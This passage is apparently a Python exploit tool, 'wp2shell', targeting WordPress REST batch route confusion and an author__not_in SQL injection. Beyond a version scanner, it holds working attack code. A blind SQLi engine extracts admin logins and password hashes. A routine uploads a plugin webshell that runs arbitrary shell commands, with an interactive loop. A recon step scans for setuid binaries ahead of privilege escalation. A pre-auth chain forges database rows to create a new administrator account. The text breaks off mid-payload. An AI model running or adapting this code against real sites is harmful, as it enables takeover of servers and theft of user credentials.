#!/usr/bin/env python3
# wp2shell — all-in-one exposure scanner + validation PoC for the WordPress
# core wp2shell advisory (CVE-2026-63030 REST batch route confusion /
# CVE-2026-60137 author__not_in SQLi).
#
# Modes (select exactly one with a flag; target is positional):
#   --scan   <hosts...> [-f hosts.txt] [-j] [-t N]  non-destructive exposure check
#   --check  <url>                                   confirm blind SQLi (harmless)
#   --read   <url> --preset users                    extract data via blind SQLi
#   --read   <url> --expr "@@version"
#   --shell  <url> --password <cracked> --cmd id     RCE via a cracked admin password
#   --rce    <url> --cmd id                          credential-less pre-auth RCE
#   --rce    <url> -i                                credential-less RCE, interactive shell
#   --root-prereq <url> --password <cracked>         benign LPE prereq check
#
#
# Python standard library only.
import argparse
import base64
import concurrent.futures as cf
import hashlib
import html as html_mod
import http.cookiejar as cookiejar
import io
import json
import re
import secrets
import shlex
import ssl
import statistics
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid
import zipfile
from urllib import request, error

UA = "wp2shell-rce/1.0"
TIMEOUT = 15
DEFAULT_DELAY = 0.15
DEFAULT_TIMEOUT = 15

BANNER = r"""
  _____          _         ____
 |__  /___ _ __ | |__  _ _/ ___|  ___  ___
   / // _ \ '_ \| '_ \| '__\___ \ / _ \/ __|
  / /|  __/ |_) | | | | |   ___) |  __/ (__
 /____\___| .__/|_| |_|_|  |____/ \___|\___|
          |_|       wp2shell  -  ZephrSec
"""


def _banner():
    """Print the ZephrSec banner (stderr, so --scan -j stdout stays clean JSON)."""
    sys.stderr.write(BANNER + "\n")


class _KeepPost(urllib.request.HTTPRedirectHandler):
    """Follow redirects but PRESERVE the POST method and body. urllib's default
    handler downgrades a redirected POST to a bodyless GET (301/302/303), which
    would silently drop the batch payload when a site redirects http->https or
    to a canonical host and produce a false negative. Loop protection
    (max_redirections) is still enforced by the parent."""
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        if req.get_method() == "POST" and code in (301, 302, 303, 307, 308):
            hdrs = {k: v for k, v in req.header_items()
                    if k.lower() != "content-length"}
            return urllib.request.Request(newurl, data=req.data, headers=hdrs,
                                          origin_req_host=req.origin_req_host,
                                          unverifiable=True, method="POST")
        return super().redirect_request(req, fp, code, msg, headers, newurl)


# ==========================================================================
# scan — non-destructive exposure check (version fingerprint + batch route)
# ==========================================================================
def http(url, method="GET", data=None):
    headers = {"User-Agent": UA}
    if data:
        headers["Content-Type"] = "application/json"
    req = request.Request(url, method=method, data=data, headers=headers)
    try:
        with request.urlopen(req, timeout=TIMEOUT) as r:
            return r.status, r.read(100000).decode("utf-8", "replace")
    except error.HTTPError as e:
        body = e.read(100000).decode("utf-8", "replace") if e.fp else ""
        return e.code, body
    except Exception:
        return None, None


def _vkey(ver):
    # WordPress version -> comparable tuple that orders pre-releases correctly
    # (alpha < beta < rc < stable), e.g. 7.1-beta1 < 7.1-beta2 < 7.1.
    head, _, tail = ver.partition("-")
    nums = [int(x) for x in re.findall(r"\d+", head)[:3]]
    while len(nums) < 3:
        nums.append(0)
    stage, sub = 3, 0  # no suffix == stable release
    tl = tail.lower()
    if tl.startswith("alpha"):
        stage = 0
    elif tl.startswith("beta"):
        stage = 1
    elif tl.startswith("rc"):
        stage = 2
    if tail:
        m = re.search(r"\d+", tail)
        sub = int(m.group()) if m else 0
    return tuple(nums) + (stage, sub)


def affected(ver):
    if not ver:
        return None
    k = _vkey(ver)
    # CVE-2026-63030: REST batch route-confusion + SQLi that chains to RCE.
    # Affects the 6.9 and 7.0 lines, plus 7.1 pre-releases up to 7.1-beta2
    # (7.1-beta2 shipped the fix); these are also hit by CVE-2026-60137.
    if ((6, 9, 0, 0, 0) <= k < (6, 9, 5, 3, 0)
            or (7, 0, 0, 0, 0) <= k < (7, 0, 2, 3, 0)
            or (7, 1, 0, 0, 0) <= k < (7, 1, 0, 1, 2)):
        return ("RCE", "CVE-2026-63030 (+ CVE-2026-60137)")
    # CVE-2026-60137: facilitated SQL injection only; no RCE chain on the 6.8 line.
    if (6, 8, 0, 0, 0) <= k < (6, 8, 6, 3, 0):
        return ("SQLi", "CVE-2026-60137")
    return None


def scan_host(host):
    base = (host if "://" in host else "https://" + host).rstrip("/")
    status, body = http(base + "/")
    if status is None:
        return {"host": host, "verdict": "unreachable"}
    m = re.search(r'name="generator" content="WordPress ([^"]+)"', body or "")
    ver = m.group(1).strip() if m else None
    _, batch = http(base + "/?rest_route=/batch/v1", "POST", b"{}")
    route = bool(batch) and ("rest_missing_callback_param" in batch or "rest_invalid_param" in batch)
    hit = affected(ver)
    sev, cve = hit if hit else (None, None)
    if hit and route:
        verdict = f"VULNERABLE ({sev}, {cve})"
    elif hit:
        verdict = f"version-affected ({sev}, {cve}), route unconfirmed"
    elif ver:
        verdict = "not affected"
    else:
        verdict = "wordpress not detected"
    return {"host": host, "version": ver, "batch_route": route,
            "severity": sev, "cve": cve, "verdict": verdict}


def cmd_scan(args):
    targets = list(args.hosts)
    if args.file:
        with open(args.file) as f:
            targets += [l.strip() for l in f if l.strip() and not l.startswith("#")]
    if not targets:
        print("[-] provide one or more hosts, or -f hosts.txt", file=sys.stderr)
        return 2

    print("[*] scanning %d host(s) for wp2shell exposure ..." % len(targets),
          file=sys.stderr)
    with cf.ThreadPoolExecutor(max_workers=args.threads) as ex:
        results = list(ex.map(scan_host, targets))

    if args.json:
        print(json.dumps(results, indent=2))
    else:
        for r in results:
            ver = f"  [{r['version']}]" if r.get("version") else ""
            print(f"{r['host']:<40} {r['verdict']}{ver}")
    return 0


# ==========================================================================
# Blind SQL injection engine (CVE-2026-60137 reached via CVE-2026-63030)
# ==========================================================================
class BlindSQLi:
    def __init__(self, base_url, prefix="wp_", delay=DEFAULT_DELAY,
                 timeout=DEFAULT_TIMEOUT, repeats=1):
        self.url = base_url.rstrip("/") + "/?rest_route=/batch/v1"
        self.prefix = prefix
        self.delay = delay
        self.timeout = timeout
        self.repeats = repeats
        self.cutoff = None

    def _payload(self, condition):
        # The injected subquery lands inside `... post_author NOT IN (%s)`
        # of WP_Query once the batch route-confusion desync makes the inner
        # /wp/v2/categories request execute under the posts handler, where
        # its author_exclude param is forwarded to WP_Query unsanitized.
        inject = "SELECT IF((%s),SLEEP(%s),0)" % (condition, self.delay)
        query = urllib.parse.urlencode({"author_exclude": inject})
        return {
            "requests": [
                {"method": "POST", "path": "http://:"},
                {"method": "POST", "path": "/wp/v2/posts", "body": {
                    "requests": [
                        {"method": "GET", "path": "http://:"},
                        {"method": "GET", "path": "/wp/v2/categories?" + query},
                        {"method": "GET", "path": "/wp/v2/posts"},
                    ]}},
                {"method": "POST", "path": "/batch/v1"},
            ]
        }

    def _once(self, condition):
        data = json.dumps(self._payload(condition)).encode()
        req = urllib.request.Request(
            self.url, data=data,
            headers={"Content-Type": "application/json"}, method="POST")
        start = time.perf_counter()
        with urllib.request.urlopen(req, timeout=self.timeout) as resp:
            resp.read()
        return time.perf_counter() - start

    def probe(self, condition):
        if self.repeats == 1:
            return self._once(condition)
        return statistics.median(self._once(condition) for _ in range(self.repeats))

    def calibrate(self, rounds=3):
        fast = statistics.median(self.probe("1=0") for _ in range(rounds))
        slow = statistics.median(self.probe("1=1") for _ in range(rounds))
        self.cutoff = (fast + slow) / 2
        return fast, slow

    def yes(self, condition):
        if self.cutoff is None:
            self.calibrate()
        return self.probe(condition) > self.cutoff

    def length(self, value, cap=128):
        low, high = 0, cap
        while low < high:
            mid = (low + high + 1) // 2
            if self.yes("CHAR_LENGTH(%s) >= %d" % (value, mid)):
                low = mid
            else:
                high = mid - 1
        return low

    def extract(self, expr, cap=128, on_char=None):
        value = "COALESCE((%s),0x00)" % expr
        n = self.length(value, cap)
        out = ""
        for pos in range(1, n + 1):
            lo, hi = 0, 255
            while lo < hi:
                mid = (lo + hi + 1) // 2
                cond = "ASCII(SUBSTRING(%s,%d,1)) >= %d" % (value, pos, mid)
                if self.yes(cond):
                    lo = mid
                else:
                    hi = mid - 1
            out += chr(lo)
            if on_char:
                on_char(out)
        return out

    def preset(self, name):
        p = self.prefix
        presets = {
            "version": "@@version",
            "database": "DATABASE()",
            "db_user": "CURRENT_USER()",
            # login:hash of the lowest-ID user (near-always the first admin)
            "users": ("SELECT CONCAT_WS(0x3a,user_login,user_pass) "
                      "FROM %susers ORDER BY ID ASC LIMIT 1" % p),
            # 0x7369746575726c == 'siteurl'; hex avoids quoting in the payload
            "siteurl": ("SELECT option_value FROM %soptions "
                        "WHERE option_name=0x7369746575726c LIMIT 1" % p),
        }
        if name not in presets:
            raise KeyError(name)
        return presets[name]


# ==========================================================================
# check / read
# ==========================================================================
def cmd_check(args):
    s = BlindSQLi(args.url, prefix=args.prefix, delay=args.delay,
                  timeout=args.timeout, repeats=args.repeats)
    print("[*] confirming blind SQLi (time-based differential) ...")
    fast, slow = s.calibrate()
    margin = slow - fast
    print("[*] baseline fast(1=0)=%.3fs  slow(1=1)=%.3fs  margin=%.3fs"
          % (fast, slow, margin))
    if margin < max(0.08, s.delay * 0.5):
        print("[-] NOT vulnerable (no measurable time differential)")
        return 1
    print("[+] VULNERABLE — blind time-based SQLi confirmed "
          "(CVE-2026-60137 via CVE-2026-63030)")
    return 0


def cmd_read(args):
    s = BlindSQLi(args.url, prefix=args.prefix, delay=args.delay,
                  timeout=args.timeout, repeats=args.repeats)
    if args.expr:
        expr = args.expr
    else:
        try:
            expr = s.preset(args.preset)
        except KeyError:
            print("[-] unknown preset: %s" % args.preset)
            return 2
    print("[*] calibrating blind-SQLi timing oracle ...")
    s.calibrate()
    print("[*] extracting via blind SQLi: %s" % expr)
    result = s.extract(expr, cap=args.max_len,
                       on_char=lambda cur: print("    " + cur, end="\r", flush=True))
    print(" " * 60, end="\r")
    print("[+] %s" % result)
    return 0


# ==========================================================================
# shell — RCE chain via a cracked/recovered admin password
# ==========================================================================
def _build_plugin_zip(slug, token):
    php = """<?php
/*
Plugin Name: %s
Description: AUTHORIZED wp2shell RCE PoC. Token-gated; self-deletes on ?rm=1.
Version: 0.0.1
*/
$__t = %r;
if (isset($_GET['tok']) && hash_equals($__t, (string) $_GET['tok'])) {
    if (isset($_GET['rm'])) { @unlink(__FILE__); echo 'WP2SHELL_REMOVED'; exit; }
    if (isset($_GET['c'])) {
        echo "WP2SHELL_OUT_START\\n";
        system($_GET['c']);
        echo "\\nWP2SHELL_OUT_END";
    }
    exit;
}
""" % (slug, token)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("%s/%s.php" % (slug, slug), php)
    return buf.getvalue()


def _nonce(html):
    m = re.search(r'name="_wpnonce"\s+value="([a-f0-9]+)"', html)
    return m.group(1) if m else None


def _run_plugin_commands(args, commands, interactive=False):
    host = urllib.parse.urlparse(args.url).hostname or ""
    base = args.url.rstrip("/")

    cj = cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    opener.addheaders = [("User-Agent", "wp2shell-poc/1.0")]

    def get(path):
        with opener.open(base + path, timeout=args.timeout) as r:
            return r.read().decode("utf-8", "replace")

    def post(path, fields, multipart=None):
        if multipart is not None:
            body, ctype = multipart
        else:
            body = urllib.parse.urlencode(fields).encode()
            ctype = "application/x-www-form-urlencoded"
        req = urllib.request.Request(base + path, data=body,
                                     headers={"Content-Type": ctype}, method="POST")
        with opener.open(req, timeout=args.timeout) as r:
            return r.read().decode("utf-8", "replace")

    # authenticate with the recovered/cracked admin password
    print("[+] ZephrSec PoC")
    print("[*] logging in as %s ..." % args.user)
    get("/wp-login.php")  # sets wordpress_test_cookie
    post("/wp-login.php", {
        "log": args.user, "pwd": args.password, "wp-submit": "Log In",
        "redirect_to": base + "/wp-admin/", "testcookie": "1",
    })
    if not any(c.name.startswith("wordpress_logged_in") for c in cj):
        print("[-] login failed (bad credentials or login hardening).")
        return 1, {}
    print("[+] authenticated")

    # upload a token-gated plugin (reachable without activation)
    slug = "wp2shell-" + secrets.token_hex(4)
    token = secrets.token_urlsafe(18)
    zip_bytes = _build_plugin_zip(slug, token)
    upload_page = get("/wp-admin/plugin-install.php?tab=upload")
    nonce = _nonce(upload_page)
    if not nonce:
        print("[-] could not read upload nonce")
        return 1, {}

    boundary = "----wp2shell" + secrets.token_hex(8)
    parts = []
    for name, val in [("_wpnonce", nonce),
                      ("_wp_http_referer", "/wp-admin/plugin-install.php?tab=upload"),
                      ("install-plugin-submit", "Install Now")]:
        parts.append("--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n"
                     % (boundary, name, val))
    parts.append("--%s\r\nContent-Disposition: form-data; name=\"pluginzip\"; "
                 "filename=\"%s.zip\"\r\nContent-Type: application/zip\r\n\r\n"
                 % (boundary, slug))
    body = "".join(parts).encode() + zip_bytes + ("\r\n--%s--\r\n" % boundary).encode()
    print("[*] uploading token-gated webshell plugin (%s) ..." % slug)
    resp = post("/wp-admin/update.php?action=upload-plugin", None,
                multipart=(body, "multipart/form-data; boundary=" + boundary))
    if "successfully" not in resp.lower() and "wp2shell" not in resp.lower():
        print("[-] plugin upload may have failed (check WP version/permissions)")

    # execute command(s) via the dropped, token-gated file
    shell_path = "/wp-content/plugins/%s/%s.php" % (slug, slug)
    outputs = {}
    rc = 0

    def run_remote(label, cmd, announce=True):
        q = urllib.parse.urlencode({"tok": token, "c": cmd})
        if announce:
            print("[*] executing [%s]: %s" % (label, cmd))
        out = get(shell_path + "?" + q)
        m = re.search(r"WP2SHELL_OUT_START\n(.*)\nWP2SHELL_OUT_END", out, re.S)
        if m:
            return 0, m.group(1)
        print("[-] no exec marker returned for %s; dropped file may not be reachable" % label)
        print(out[:400])
        return 1, ""

    if interactive:
        print("[+] interactive command loop on %s (type 'exit' or Ctrl-D to quit)" % host)
        print("[*] note: this is a web command loop, not a PTY; job control and TTY-only tools will not work")
        cwd = "/var/www/html"
        cwd_rc, cwd_out = run_remote("pwd", "pwd", announce=False)
        if cwd_rc == 0 and cwd_out.strip():
            cwd = cwd_out.strip().splitlines()[-1]
        while True:
            try:
                line = input("wp2shell:%s$ " % cwd)
            except (EOFError, KeyboardInterrupt):
                print()
                break
            line = line.strip()
            if not line:
                continue
            if line in ("exit", "quit"):
                break

            if line == "pwd":
                print(cwd)
                continue

            if line.startswith("cd"):
                try:
                    parts = shlex.split(line)
                except ValueError as e:
                    print("cd: %s" % e)
                    continue
                target = parts[1] if len(parts) > 1 else "~"
                cmd = "cd %s && cd %s && pwd" % (shlex.quote(cwd), shlex.quote(target))
                one_rc, one_out = run_remote("cd", cmd, announce=False)
                if one_rc == 0 and one_out.strip():
                    cwd = one_out.strip().splitlines()[-1]
                else:
                    rc = 1
                continue

            cmd = "cd %s && %s" % (shlex.quote(cwd), line)
            one_rc, one_out = run_remote("interactive", cmd, announce=False)
            if one_out:
                print(one_out, end="" if one_out.endswith("\n") else "\n")
            if one_rc:
                rc = one_rc
    else:
        for label, cmd in commands:
            one_rc, one_out = run_remote(label, cmd)
            if one_rc:
                rc = one_rc
                break
            outputs[label] = one_out

    # clean up unless told otherwise
    if not args.no_cleanup:
        try:
            get(shell_path + "?" + urllib.parse.urlencode({"tok": token, "rm": "1"}))
            print("[*] cleanup: removed dropped plugin file")
        except Exception as e:
            print("[!] cleanup failed, remove %s manually: %s" % (shell_path, e))
    return rc, outputs


def cmd_shell(args):
    if not args.yes and not _confirm_authorization(
            args.url, "log in, upload a webshell plugin, and run commands"):
        print("[-] aborted: authorization not confirmed")
        return 2

    if args.interactive:
        rc, _ = _run_plugin_commands(args, [], interactive=True)
        return rc

    rc, outputs = _run_plugin_commands(args, [("cmd", args.cmd)])
    if rc:
        return rc
    host = urllib.parse.urlparse(args.url).hostname or ""
    print("[+] RCE confirmed on %s. command output:\n%s" % (host, outputs.get("cmd", "")))
    return 0


def _bool_line(text, needle):
    return any(line.strip() == needle for line in (text or "").splitlines())


def _assess_root_prereqs(outputs):
    supported_archs = {"x86_64", "i386", "i686", "armv5l", "armv6l",
                       "armv7l", "arm", "aarch64"}
    uid_text = outputs.get("uid", "")
    uname = outputs.get("uname", "").lower()
    arch = (outputs.get("arch", "").strip().splitlines() or [""])[-1].strip()
    py = outputs.get("python", "")
    af_alg = outputs.get("af_alg", "")
    suid = outputs.get("suid_scan", "")
    crypto = outputs.get("crypto", "")

    uid_match = re.search(r"uid=(\d+)|^(\d+)$", uid_text, re.M)
    uid = next((g for g in uid_match.groups() if g), None) if uid_match else None
    suid_lines = [l.strip() for l in suid.splitlines() if l.strip().startswith("/")]

    checks = [
        ("remote-code-execution", "confirmed" if uid_text else "unknown",
         bool(uid_text)),
        ("non-root-web-user", "uid=%s" % uid if uid else "unknown",
         uid is not None and uid != "0"),
        ("linux-kernel", outputs.get("uname", "").strip() or "unknown",
         "linux" in uname),
        ("supported-architecture", arch or "unknown", arch in supported_archs),
        ("python-runtime", py.strip() or "not found",
         "Python " in py or re.search(r"\b3\.\d+\.\d+\b", py)),
        ("af_alg-authencesn", (af_alg.strip() or crypto.strip() or "not available"),
         _bool_line(af_alg, "AF_ALG_AUTHENCESN_OK") or "authencesn" in crypto),
        ("setuid-root-targets", "%d found" % len(suid_lines), bool(suid_lines)),
    ]
    exploitable = all(ok for _, _, ok in checks)
    return checks, exploitable, suid_lines


def cmd_root_prereq(args):
    py_probe = (
        "python3 -c \"import socket; "
        "s=socket.socket(socket.AF_ALG,socket.SOCK_SEQPACKET,0); "
        "s.bind(('aead','authencesn(hmac(sha256),cbc(aes))',0,0)); "
        "print('AF_ALG_AUTHENCESN_OK')\" 2>&1"
    )
    commands = [
        ("uid", "id; id -u"),
        ("uname", "uname -srm"),
        ("arch", "uname -m"),
        ("python", "python3 --version 2>&1 || python --version 2>&1 || true"),
        ("af_alg", py_probe),
        ("crypto", "grep -E '^name[[:space:]]*:[[:space:]]*(authencesn|hmac\\(sha256\\)|cbc\\(aes\\)|aes)' /proc/crypto 2>/dev/null | head -20 || true"),
        ("suid_scan", "find /usr /bin /sbin /opt /snap -xdev -perm -4000 -user root -type f 2>/dev/null | head -50"),
        ("container", "cat /proc/1/cgroup 2>/dev/null | head -20; test -f /.dockerenv && echo DOCKERENV_PRESENT || true"),
    ]
    if not args.yes and not _confirm_authorization(
            args.url, "log in, upload a diagnostic plugin, and run commands"):
        print("[-] aborted: authorization not confirmed")
        return 2
    rc, outputs = _run_plugin_commands(args, commands)
    if rc:
        return rc

    checks, exploitable, suid_lines = _assess_root_prereqs(outputs)
    print("\n[+] RCE confirmed; root escalation prerequisite report:")
    for name, detail, ok in checks:
        mark = "OK" if ok else "NO"
        print("    %-24s %-3s %s" % (name, mark, detail))

    if suid_lines:
        print("\n[*] setuid-root candidates (first %d):" % len(suid_lines))
        for path in suid_lines:
            print("    %s" % path)

    container = outputs.get("container", "").strip()
    if container:
        print("\n[*] container indicators:\n%s" % container)

    print()
    if exploitable:
        print("[+] root-prereq: prerequisites appear present for manual copyfail validation.")
        print("    No local privilege escalation was executed by this command.")
        return 0

    print("[-] root-prereq: one or more prerequisites are missing or unconfirmed.")
    print("    No local privilege escalation was executed by this command.")
    return 1


# ==========================================================================
# rce — credential-less pre-auth RCE (no cracked password needed)
# Turns the read-only SQLi into DB writes to forge an administrator, then
# deploys a self-cleaning webshell. See deploy() for the step-by-step chain.
# Route confusion + SQLi: Adam Kues (Assetnote); stock-default RCE chain
# (oEmbed -> changeset -> re-entry): Mustafa Can İPEKÇİ (nukedx).
# ==========================================================================
class PreAuthRCE:
    UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
          "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")
    PRIMER = "http://:"
    EMBED_ATTR = 'a:2:{s:5:"width";s:3:"500";s:6:"height";s:3:"750";}'

    def __init__(self, base, timeout=30, proxy=None, sleep=4.0, route="auto"):
        self.base = base.rstrip("/")
        self.timeout = timeout
        self.sleep = float(sleep)
        self.route = route
        self._proxy = proxy
        self.batch = None        # resolved endpoint URL (canonical, post-redirect)
        self._base = 0.0         # measured baseline round-trip (used by the oracle)
        self._normalized = False
        # Ignore TLS verification (self-signed / expired certs common on test
        # targets). Equivalent to `curl -k`.
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        handlers = [urllib.request.HTTPSHandler(context=ctx), _KeepPost()]
        if proxy:
            handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
        else:
            handlers.append(urllib.request.ProxyHandler({}))  # ignore env proxies
        self.opener = urllib.request.build_opener(*handlers)

    def _normalize_base(self):
        """Follow redirects on the root once and pin the canonical scheme://host
        so the batch POST goes straight to the final host. Only scheme+host are
        taken (never a redirected path), so REST routes stay correct."""
        if self._normalized:
            return
        self._normalized = True
        try:
            req = urllib.request.Request(self.base + "/", headers={"User-Agent": self.UA})
            with self.opener.open(req, timeout=self.timeout) as r:
                u = urllib.parse.urlparse(r.geturl())
                if u.scheme and u.netloc:
                    canon = "%s://%s" % (u.scheme, u.netloc)
                    if canon != self.base:
                        self.base = canon
                        self.batch = None
        except Exception:
            pass

    def _raw(self, url, data=None, headers=None, method=None):
        hdrs = dict(headers or {})
        hdrs.setdefault("User-Agent", self.UA)
        req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
        t0 = time.perf_counter()
        try:
            with self.opener.open(req, timeout=self.timeout) as r:
                return r.status, time.perf_counter() - t0, r.read(), r.geturl()
        except urllib.error.HTTPError as e:
            return e.code, time.perf_counter() - t0, e.read(), getattr(e, "url", url)

    def _endpoints(self):
        if self.route == "wp-json":
            return [self.base + "/wp-json/batch/v1"]
        if self.route == "rest-route":
            return [self.base + "/?rest_route=/batch/v1"]
        return [self.base + "/?rest_route=/batch/v1", self.base + "/wp-json/batch/v1"]

    @staticmethod
    def _envelope(author_exclude):
        """Nested batch (route confusion) landing author_exclude in author__not_in."""
        enc = urllib.parse.quote(author_exclude, safe="")
        inner = {"requests": [
            {"method": "POST", "path": "///"},
            {"method": "GET",  "path": "/wp/v2/users?author_exclude=" + enc},
            {"method": "GET",  "path": "/wp/v2/posts"},
        ]}
        return {"requests": [
            {"method": "POST", "path": "/v2/categories", "body": {"name": "x"}},
            {"method": "POST", "path": "///", "body": {"name": "x"}},
            {"method": "POST", "path": "/wp/v2/posts", "body": inner},
            {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
        ]}

    def probe(self, author_exclude):
        """Send one injection carrying author_exclude into author__not_in."""
        self._normalize_base()
        body = json.dumps(self._envelope(author_exclude)).encode()
        headers = {"Content-Type": "application/json"}
        if self.batch is None:
            for ep in self._endpoints():
                st, _, _, final = self._raw(ep, data=body, headers=headers, method="POST")
                if st in (200, 207):
                    self.batch = final
                    break
            if self.batch is None:
                self.batch = self._endpoints()[0]
        st, el, _, _ = self._raw(self.batch, data=body, headers=headers, method="POST")
        return st, el

    @staticmethod
    def _sleep_payload(seconds):
        return "0) OR (SELECT 1 FROM (SELECT SLEEP(%g))x)-- -" % seconds

    def detect(self, rounds=3):
        fast = statistics.median(self.probe(self._sleep_payload(0))[1] for _ in range(rounds))
        slow = statistics.median(self.probe(self._sleep_payload(self.sleep))[1] for _ in range(rounds))
        self._base = fast
        delta = slow - fast
        vulnerable = delta >= (self.sleep * 0.6) and fast < (self.sleep * 0.5)
        return {"fast": fast, "slow": slow, "delta": delta, "vulnerable": vulnerable}

    def _oracle(self, cond, unit=0.6):
        payload = "0) OR (SELECT 1 FROM (SELECT IF((%s),SLEEP(%g),0))x)-- -" % (cond, unit)
        _, el = self.probe(payload)
        return el > (self._base + unit * 0.6)

    def read_scalar(self, expr, maxlen=40, unit=0.6):
        v = "COALESCE((%s),'')" % expr
        lo, hi = 0, maxlen
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self._oracle("CHAR_LENGTH(%s)>=%d" % (v, mid), unit):
                lo = mid
            else:
                hi = mid - 1
        out = ""
        for pos in range(1, lo + 1):
            a, b = 32, 126
            while a < b:
                mid = (a + b + 1) // 2
                if self._oracle("ASCII(SUBSTRING(%s,%d,1))>=%d" % (v, pos, mid), unit):
                    a = mid
                else:
                    b = mid - 1
            out += chr(a)
        return out

    def read_int(self, query, unit=0.6):
        expr = "COALESCE((%s),0)" % query
        lo, hi = 0, 1
        while self._oracle("%s >= %d" % (expr, hi), unit):
            lo, hi = hi, hi * 2
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self._oracle("%s >= %d" % (expr, mid), unit):
                lo = mid
            else:
                hi = mid - 1
        return lo

    # -- RCE: row forgery + oEmbed -> changeset -> re-entry -> admin creation --
    def _rce_send(self, inner_requests, timeout=None):
        payload = {"requests": [
            {"method": "POST", "path": self.PRIMER},
            {"method": "POST", "path": "/wp/v2/posts",
             "body": {"requests": inner_requests}},
            {"method": "POST", "path": "/batch/v1"},
        ]}
        ep = self.batch or self._endpoints()[0]
        body = json.dumps(payload).encode()
        hdrs = {"Content-Type": "application/json", "User-Agent": self.UA}
        req = urllib.request.Request(ep, data=body, headers=hdrs, method="POST")
        try:
            with self.opener.open(req, timeout=timeout or self.timeout) as resp:
                return resp.read()
        except urllib.error.HTTPError as e:
            return e.read()

    @staticmethod
    def _hex(value):
        return "0x%s" % value.encode().hex() if value else "''"

    def _post_row(self, post_id, content, title, status, name, parent, post_type):
        h = self._hex
        return ",".join((
            str(post_id), "1",
            h("2020-01-01 00:00:00"), h("2020-01-01 00:00:00"),
            h(content), h(title), "''",
            h(status), h("closed"), h("closed"), "''",
            h(name), "''", "''",
            h("2020-01-01 00:00:00"), h("2020-01-01 00:00:00"), "''",
            str(parent), "''", "0",
            h(post_type), "''", "0",
        ))

    def _forge(self, rows, extra_requests=()):
        query = ("1) AND 1=0 UNION ALL SELECT "
                 + " UNION ALL SELECT ".join(rows) + " -- -")
        self._rce_send([
            {"method": "GET", "path": self.PRIMER},
            {"method": "GET", "path": "/wp/v2/widgets?"
             + urllib.parse.urlencode({"author_exclude": query, "per_page": -1,
                                       "orderby": "none", "context": "view"})},
            {"method": "GET", "path": "/wp/v2/posts"},
            *extra_requests,
        ], timeout=60)

    def deploy(self):
        """Run the full pre-auth chain up to a live, self-cleaning webshell.
        Returns (username, password, run, cleanup): run(command) executes one
        shell command and returns its output; cleanup() deactivates and deletes
        the dropped plugin. The forged administrator is left in place. Splitting
        deploy from run lets a caller execute many commands (interactive shell)
        over one dropped webshell before cleaning up."""
        self._normalize_base()

        # 1. published post for oEmbed anchor
        try:
            with self.opener.open(
                urllib.request.Request(
                    self.base + "/?rest_route=/wp/v2/posts&per_page=1&_fields=link",
                    headers={"User-Agent": self.UA}), timeout=15) as resp:
                items = json.loads(resp.read())
        except Exception:
            items = []
        if not items or not items[0].get("link"):
            raise RuntimeError("no published post for oEmbed anchor")

        link = urllib.parse.urlsplit(items[0]["link"])
        token = secrets.token_hex(6)
        embed_urls = [
            urllib.parse.urlunsplit((
                link.scheme, link.netloc, link.path, link.query,
                "%s%d" % (token, i)))
            for i in range(3)]

        # 2. seed 3 oEmbed caches (forged post with [embed] shortcodes -> DB writes)
        sys.stderr.write("[2/6] seeding oEmbed caches (read-only SQLi -> real DB writes) ...\n")
        seed_content = "".join(
            '[embed width="500" height="750"]%s[/embed]' % u for u in embed_urls)
        self._forge([self._post_row(
            0, seed_content, "seed", "publish", "seed", 0, "post")])

        # 3. extract table prefix, admin ID, seeded cache post IDs
        sys.stderr.write("[3/6] recon: reading DB table prefix via blind SQLi ...\n")
        posts_table = self.read_scalar(
            "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES "
            "WHERE TABLE_SCHEMA=DATABASE() "
            "AND RIGHT(TABLE_NAME,6)=0x5f706f737473 "
            "ORDER BY CHAR_LENGTH(TABLE_NAME),TABLE_NAME LIMIT 1", 64)
        if not re.fullmatch(r"[A-Za-z0-9_$]+", posts_table):
            raise RuntimeError("could not resolve posts table (%r)" % posts_table)
        prefix = posts_table[:-5]
        sys.stderr.write("[+] table prefix: %s\n" % (prefix or "(empty)"))

        sys.stderr.write("[3/6] recon: locating an administrator account ...\n")
        admin_id = self.read_int(
            "SELECT u.ID FROM `%susers` u JOIN `%susermeta` m "
            "ON m.user_id=u.ID WHERE m.meta_key=%s "
            "AND INSTR(m.meta_value,%s)>0 "
            "ORDER BY u.ID LIMIT 1" % (
                prefix, prefix,
                self._hex(prefix + "capabilities"),
                self._hex('s:13:"administrator";b:1;')))
        if admin_id < 1:
            raise RuntimeError("could not locate an administrator")
        sys.stderr.write("[+] admin ID: %d\n" % admin_id)

        sys.stderr.write("[3/6] recon: recovering seeded oEmbed cache post IDs ...\n")
        cache_ids = []
        for u in embed_urls:
            key = hashlib.md5((u + self.EMBED_ATTR).encode()).hexdigest()
            pid = self.read_int(
                "SELECT ID FROM `%s` WHERE post_type=0x6f656d6265645f6361636865 "
                "AND post_name=0x%s ORDER BY ID DESC LIMIT 1" % (
                    posts_table, key.encode().hex()))
            if pid < 1:
                raise RuntimeError("oEmbed cache seeding failed")
            cache_ids.append(pid)
        if len(set(cache_ids)) != 3:
            raise RuntimeError("oEmbed cache IDs not distinct")
        sys.stderr.write("[+] cache IDs: %s\n" % cache_ids)

        # 4. forge changeset elevation + re-entrant parse_request, create admin
        username = "w2s_%s" % token
        password = "W2s!%s" % secrets.token_urlsafe(15)
        email = "%s@wp2shell.local" % username
        outer = 1800000000 + secrets.randbelow(100000000)
        nav_id, inner_id = outer + 1, outer + 2

        changeset = json.dumps({
            "nav_menu_item[%d]" % nav_id: {
                "value": {
                    "object_id": 0, "object": "", "menu_item_parent": 0,
                    "position": 0, "type": "custom", "title": "proof",
                    "url": "https://github.com/dinosn/wp2shell-lab",
                    "target": "", "attr_title": "", "description": "proof",
                    "classes": "", "xfn": "", "status": "publish",
